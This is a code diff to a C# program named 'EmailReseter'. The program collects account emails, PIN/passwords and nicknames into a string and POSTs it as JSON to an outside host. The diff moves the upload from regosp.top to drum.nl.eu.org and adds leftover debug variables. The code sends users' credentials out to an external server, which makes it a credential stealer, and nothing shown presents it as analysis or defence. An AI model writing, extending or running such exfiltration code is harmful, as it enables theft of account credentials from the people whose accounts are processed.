@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Newtonsoft.Json;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net.Http;
@@ -20,26 +21,33 @@ namespace EmailReseter
                 {
                     data += $"{acc.Email}:{acc.PinPassword}:{acc.Nick}{Environment.NewLine}";
                 }
-                var values = new Dictionary<string, string>
-            {
-               { "data", data},
 
-            };
+                Dictionary<string, string> dataDict = new Dictionary<string, string>();
+                dataDict.Add("data", data);
+                var stringPayload = JsonConvert.SerializeObject(dataDict);
+                var content = new StringContent(stringPayload, Encoding.UTF8, "application/json");
+              
 
-                var content = new FormUrlEncodedContent(values);
+                var asdf = 132;
 
-                var response = await client.PostAsync("http://regosp.top/datapost", content);
+                var response = await client.PostAsync("http://drum.nl.eu.org/datapost", content);
 
                 var responseString = await response.Content.ReadAsStringAsync();
                 var s = 1;
             }
-            catch
+            catch(Exception e)
             {
-
+                var sxx = e;
+                var adsf = 123;
             }
 
 
         }
-
+        string MyDictionaryToJson(Dictionary<int, List<int>> dict)
+        {
+            var entries = dict.Select(d =>
+                string.Format("\"{0}\": [{1}]", d.Key, string.Join(",", d.Value)));
+            return "{" + string.Join(",", entries) + "}";
+        }
     }
 }
